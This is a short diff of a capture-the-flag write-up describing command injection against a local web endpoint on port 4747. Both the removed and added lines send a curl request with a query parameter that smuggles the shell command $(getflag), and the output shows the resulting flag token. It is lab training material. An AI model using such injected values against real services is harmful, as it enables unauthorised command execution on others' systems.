@@ -10,11 +10,9 @@
 > x(param("x"));
 
 It is exposing an http endpoint on localhost:4747 so we will use curl to request it
-we can exploit `echo $y` by escaping our x query param
-
-$(getflag) -> encode -> %24%28getflag%29
+we can exploit `echo $y`
 
 then execute
-`curl http://localhost:4747/?x="%24%28getflag%29"
+`curl http://localhost:4747/?x="\$(getflag)"
 
 > Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
